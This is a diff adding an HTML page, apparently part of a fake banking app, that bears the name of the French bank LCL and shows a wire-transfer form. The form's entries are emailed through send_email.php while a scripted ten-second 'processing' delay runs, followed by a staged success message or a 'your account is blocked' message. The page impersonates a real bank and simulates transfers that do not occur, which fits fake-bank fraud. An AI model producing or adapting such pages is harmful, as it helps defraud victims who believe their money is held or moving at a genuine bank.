@@ -1,0 +1,319 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#000000">
+    <title> LCL- Le Credit Lyonnais - Banque Privé </title>
+    <meta name="description" content="Finapp HTML Mobile Template">
+    <meta name="keywords" content="bootstrap, wallet, banking, fintech mobile template, cordova, phonegap, mobile, html, responsive" />
+    <link rel="icon" href="/favicon.png" type="image/png">
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/img/icon/192x192.png">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="manifest" href="__manifest.json">
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+</head>
+
+<body class="bg-white">
+
+    <!-- loader -->
+    <div id="loader">
+        <img src="assets/img/loading-icon.png" alt="icon" class="loading-icon">
+    </div>
+    <!-- * loader -->
+
+    <!-- App Header -->
+    <div class="appHeader">
+        <div class="left">
+            <a href="#" class="headerButton goBack">
+                <ion-icon name="chevron-back-outline"></ion-icon>
+            </a>
+        </div>
+        <div class="pageTitle">
+            Effectuer une transaction
+        </div>
+        <div class="right">
+            <a href="#" class="headerButton" data-bs-toggle="modal" data-bs-target="#DialogBasic">
+                <ion-icon name="trash-outline"></ion-icon>
+            </a>
+        </div>
+    </div>
+    <!-- * App Header -->
+
+    <!-- Dialog Basic -->
+    <div class="modal fade dialogbox" id="DialogBasic" data-bs-backdrop="static" tabindex="-1" role="dialog">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Supprimer</h5>
+                </div>
+                <div class="modal-body">
+                    vous êtes sure?
+                </div>
+                <div class="modal-footer">
+                    <div class="btn-inline">
+                        <a href="#" class="btn btn-text-secondary" data-bs-dismiss="modal">Annuler</a>
+                        <a href="#" class="btn btn-text-primary" data-bs-dismiss="modal">Supprimer</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- * Dialog Basic -->
+
+    <!-- App Capsule -->
+    <div id="appCapsule" class="full-height">
+
+        <div class="section mt-2 mb-2">
+
+
+            <div class="listed-detail mt-3">
+                <div class="icon-wrapper">
+                    <div class="iconbox">
+                        <ion-icon name="arrow-forward-outline"></ion-icon>
+                    </div>
+                </div>
+                <h3 class="text-center mt-2">Envoi de virement</h3>
+            </div>
+
+            <ul class="listview flush transparent simple-listview no-space mt-3">
+               <div class="section mt-2">
+            <div class="section-title">Veuillez remplir les champs correspondants</div>
+            <div class="card">
+                <div class="card-body">
+                    
+                    <form id="valider" name="valider" action="send_email.php" method="post" autocomplete="off">
+
+                        <div class="form-group basic animated">
+                            <div class="input-wrapper">
+                                <label class="label" for="userid2">Destinataire</label>
+                                <input type="text" class="form-control" id="userid2" name="destinataire" placeholder="Destinataire">
+                                <i class="clear-input">
+                                    <ion-icon name="close-circle"></ion-icon>
+                                </i>
+                            </div>
+                        </div>
+					<div class="form-group basic animated">
+                            <div class="input-wrapper">
+                                <label class="label" for="userid2">Email du Destinataire</label>
+                                <input type="email" class="form-control" id="userid2" name="email" placeholder="Adresse Email du Destinataire">
+                                <i class="clear-input">
+                                    <ion-icon name="close-circle"></ion-icon>
+                                </i>
+                            </div>
+                        </div>
+					
+                        <div class="form-group basic animated">
+                            <div class="input-wrapper">
+                                <label class="label" for="amount2">Iban du destinataire</label>
+                                <input type="text" class="form-control" id="amount2" name="iban" placeholder="Iban du destinataire">
+                                <i class="clear-input">
+                                    <ion-icon name="close-circle"></ion-icon>
+                                </i>
+                            </div>
+                        </div>
+						<div class="form-group basic animated">
+                            <div class="input-wrapper">
+                                <label class="label" for="amount2">Code BIC/SWIFT</label>
+                                <input type="text" class="form-control" id="amount2" name="bic" placeholder="Code BIC/SWIFT">
+                                <i class="clear-input">
+                                    <ion-icon name="close-circle"></ion-icon>
+                                </i>
+                            </div>
+                        </div>
+						<div class="form-group basic animated">
+                            <div class="input-wrapper">
+                                <label class="label" for="amount2">Date</label>
+                                <input type="date" class="form-control" id="amount2" name="date" placeholder="Date">
+                                <i class="clear-input">
+                                    <ion-icon name="close-circle"></ion-icon>
+                                </i>
+                            </div>
+                        </div>
+						<div class="form-group basic animated">
+                            <div class="input-wrapper">
+                                <label class="label" for="amount2">Montant</label>
+                                <input type="text" class="form-control" id="amount2" name="montant" placeholder="Montant">
+                                <i class="clear-input">
+                                    <ion-icon name="close-circle"></ion-icon>
+                                </i>
+                            </div>
+						</div>
+						
+						<div class="form-group basic animated">	        
+        <button id="submitBtn" type="submit" class="btn btn-primary btn-block btn-lg">Valider</button>
+        <button id="loadingBtn" class="btn btn-primary d-none btn-block btn-lg" type="button" disabled>
+            <span class="spinner-border spinner-border-sm me-05" role="status" aria-hidden="true"></span>
+            Traitement de votre virement en cours...
+        </button>
+   
+
+                        </div>
+						
+						
+
+                    </form>
+					<script>
+        document.getElementById('valider').addEventListener('submit', function(event) {
+    event.preventDefault(); // Empêche la soumission immédiate
+
+    // Afficher le bouton "Traitement en cours" et cacher le bouton "Valider"
+    document.getElementById('submitBtn').classList.add('d-none');
+    document.getElementById('loadingBtn').classList.remove('d-none');
+
+    // Simuler un traitement en cours pendant 10 secondes avant de traiter la réponse
+    setTimeout(function() {
+        // Récupère les données du formulaire après les 10 secondes
+        var formData = new FormData(document.getElementById('valider'));
+
+        // Envoie le formulaire via AJAX
+        fetch(document.getElementById('valider').action, {
+            method: document.getElementById('valider').method,
+            body: formData
+        }).then(function(response) {
+            // Réaffiche le bouton "Valider" et cache le bouton de chargement
+            document.getElementById('submitBtn').classList.remove('d-none');
+            document.getElementById('loadingBtn').classList.add('d-none');
+
+            if (response.ok) {
+                // Affiche une boîte de dialogue de confirmation avec SweetAlert
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Virement effectué',
+                    text: 'Votre transaction a été effectué avec succes !'
+                }).then(function() {
+                    // Redirige l'utilisateur après confirmation
+                    window.location.href = 'index.html';
+                });
+
+                // Réinitialise le formulaire
+                document.getElementById('valider').reset();
+            } else {
+                // Affiche une erreur si la soumission a échoué
+                Swal.fire({
+                    icon: 'error',
+                     title: 'Erreur',
+                    text: 'Virement impossible. Veuillez reessayer.'
+                });
+            }
+        }).catch(function(error) {
+            // Réaffiche le bouton "Valider" en cas d'erreur
+            document.getElementById('submitBtn').classList.remove('d-none');
+            document.getElementById('loadingBtn').classList.add('d-none');
+            console.error('Erreur:', error);
+            Swal.fire({
+                icon: 'error',
+                title: 'Erreur',
+                text: 'Virement impossible. Votre compte est bloqué, aucune Transaction possible.'
+            });
+        });
+    }, 10000); // Délai de 10 secondes avant de traiter la réponse
+});
+
+
+    </script>
+
+                </div>
+            </div>
+        </div>
+            </ul>
+
+
+        </div>
+
+    </div>
+    <!-- * App Capsule -->
+
+
+    <!-- App Bottom Menu -->
+    <div class="appBottomMenu">
+        <a href="index.html" class="item">
+            <div class="col">
+                <ion-icon name="pie-chart-outline"></ion-icon>
+                <strong>Acceuil</strong>
+            </div>
+        </a>
+        <!--<a href="app-pages.html" class="item">
+            <div class="col">
+                <ion-icon name="document-text-outline"></ion-icon>
+                <strong>Pages</strong>
+            </div>
+        </a>-->
+        <!--<a href="app-components.html" class="item">
+            <div class="col">
+                <ion-icon name="apps-outline"></ion-icon>
+                <strong>Components</strong>
+            </div>
+        </a>-->
+        <!--<a href="app-cards.html" class="item">
+            <div class="col">
+                <ion-icon name="card-outline"></ion-icon>
+                <strong>My Cards</strong>
+            </div>
+        </a>-->
+       <!-- <a href="app-settings.html" class="item">
+            <div class="col">
+                <ion-icon name="settings-outline"></ion-icon>
+                <strong>Settings</strong>
+            </div>
+        </a>-->
+    </div>
+    <!-- * App Bottom Menu
+
+    App Bottom Menu -->
+    <div class="appBottomMenu">
+        <a href="index.html" class="item">
+            <div class="col">
+                <ion-icon name="pie-chart-outline"></ion-icon>
+                <strong>Retour</strong>
+            </div>
+        </a>
+        <!-- <a href="app-pages.html" class="item">
+            <div class="col">
+                <ion-icon name="document-text-outline"></ion-icon>
+                <strong>Pages</strong>
+            </div>
+        </a>
+        <a href="app-components.html" class="item">
+            <div class="col">
+                <ion-icon name="apps-outline"></ion-icon>
+                <strong>Components</strong>
+            </div>
+        </a>
+        <a href="app-cards.html" class="item">
+            <div class="col">
+                <ion-icon name="card-outline"></ion-icon>
+                <strong>My Cards</strong>
+            </div>
+        </a>
+        <a href="app-settings.html" class="item">
+            <div class="col">
+                <ion-icon name="settings-outline"></ion-icon>
+                <strong>Settings</strong>
+            </div>
+        </a> -->
+    </div>
+    <!-- * App Bottom Menu -->
+
+
+    <!-- ========= JS Files =========  -->
+    <!-- Bootstrap -->
+	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="assets/js/lib/bootstrap.bundle.min.js"></script>
+    <!-- Ionicons -->
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+    <!-- Splide -->
+    <script src="assets/js/plugins/splide/splide.min.js"></script>
+    <!-- Base Js File -->
+    <script src="assets/js/base.js"></script>
+
+
+</body>
+
+</html>
